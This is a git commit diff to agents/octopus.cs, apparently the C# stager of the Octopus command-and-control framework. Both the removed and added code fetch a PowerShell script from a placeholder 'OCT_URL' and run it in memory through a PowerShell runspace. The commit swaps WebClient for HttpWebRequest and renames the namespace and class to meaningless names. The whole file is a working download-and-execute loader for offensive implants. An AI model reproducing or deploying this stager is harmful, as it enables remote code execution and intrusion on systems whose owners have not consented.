6a8624de992b0ff0bf9622044cf275d997826a02
mhaskar <m.askar@isecur1ty.org>
2020-06-03 01:22:36 +0300

    Update unmanaged c# code

--- agents/octopus.cs
+++ agents/octopus.cs
@@ -1,26 +1,24 @@
 using System.Management.Automation;
 using System.Runtime.InteropServices;
 using System.Net;
+using System.IO;
 using System;
 
-namespace TTT
+namespace TT3
 {
-    class TNoT
+    class TZTZT
     {
 
+    static void Main()
+      {
 
-        static void Main()
-        {
+    var request = (HttpWebRequest)WebRequest.Create("OCT_URL");
+    var response = (HttpWebResponse)request.GetResponse();
+    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
+    PowerShell pp = PowerShell.Create();
+	  pp.AddScript(responseString);
+	  pp.Invoke();
 
-
-		WebClient CC = new WebClient();
-		String code = CC.DownloadString("OCT_URL");
-		PowerShell pp = PowerShell.Create();
-		pp.AddScript(code);
-		pp.Invoke();
-
-
-
-        }
     }
+  }
 }
